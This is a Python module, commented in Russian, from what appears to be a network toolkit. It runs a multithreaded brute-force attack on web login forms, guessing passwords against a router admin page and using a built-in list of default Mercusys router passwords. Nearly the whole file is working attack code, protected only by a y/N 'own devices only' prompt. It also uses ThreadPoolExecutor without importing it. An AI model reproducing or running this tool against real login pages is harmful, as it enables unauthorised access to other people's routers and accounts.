import requests, re, time, threading
from .config import C
from .utils import header, ask, pause, beep

requests.packages.urllib3.disable_warnings()

def brute_form(url, password_list, user_field=None, pass_field="password", threads=5):
    print(f"\n{C.BOLD}[Form Brute]{C.RESET} {url}")
    
    # 1. Получаем страницу логина, чтобы найти поля
    try:
        r = requests.get(url, timeout=5, verify=False)
        html = r.text
    except Exception as e:
        print(f"{C.RED}Ошибка GET: {e}{C.RESET}"); return []

    # Ищем поля input
    inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>', html, re.I)
    print(f"  {C.DIM}Найдены поля ввода: {inputs}{C.RESET}")
    
    if not inputs:
        print(f"{C.RED}Не удалось найти поля формы.{C.RESET}"); return []

    # Если логин не нужен (как у Mercusys), оставляем только пароль
    if not user_field:
        for i in inputs:
            if 'pass' in i.lower() or 'pwd' in i.lower() or 'key' in i.lower():
                pass_field = i
                break
    
    print(f"  {C.DIM}Использую поле пароля: '{pass_field}'{C.RESET}")

    found = []
    lock = threading.Lock()
    
    def worker(pw):
        data = {pass_field: pw}
        try:
            # Отправляем POST
            resp = requests.post(url, data=data, timeout=5, verify=False, allow_redirects=False)
            # Успех: либо редирект (302), либо страница без слова "неверный"/"ошибка"
            if resp.status_code in (301, 302):
                with lock:
                    found.append(pw)
                    print(f"\n  {C.GREEN}🔓 НАЙДЕНО: {pw} (редирект {resp.status_code}){C.RESET}"); beep()
            elif resp.status_code == 200 and not any(w in resp.text.lower() for w in ("неверный", "incorrect", "error", "invalid")):
                with lock:
                    found.append(pw)
                    print(f"\n  {C.GREEN}🔓 ВОЗМОЖНО НАЙДЕНО: {pw} (200 OK, нет ошибки){C.RESET}"); beep()
        except:
            pass

    with ThreadPoolExecutor(max_workers=threads) as ex:
        for pw in password_list:
            ex.submit(worker, pw)
            time.sleep(0.1)
            
    return found

def menu_form_brute():
    header("ВЕБ-ФОРМА БРУТФОРС (POST)")
    print("  ⚠️ Только для своих устройств!")
    if ask("Подтверждаю (y/N): ").lower() != 'y': return
    
    url = ask("URL формы (например, http://192.168.1.1/login): ")
    if not url: return
    if not url.startswith('http'): url = 'http://' + url
    
    raw_p = ask("Пароли (через запятую, Enter — стандартные): ")
    if raw_p:
        passwords = [p.strip() for p in raw_p.split(',') if p.strip()]
    else:
        passwords = ["admin", "password", "1234", "12345678", "mercusys", "MERCUSYS"]
    
    print(f"\n{C.RED}Начинаю...{C.RESET}")
    found = brute_form(url, passwords)
    if found:
        print(f"\n{C.GREEN}Найдено: {found}{C.RESET}")
    else:
        print(f"\n{C.YELLOW}Не подобрано.{C.RESET}")
    pause()
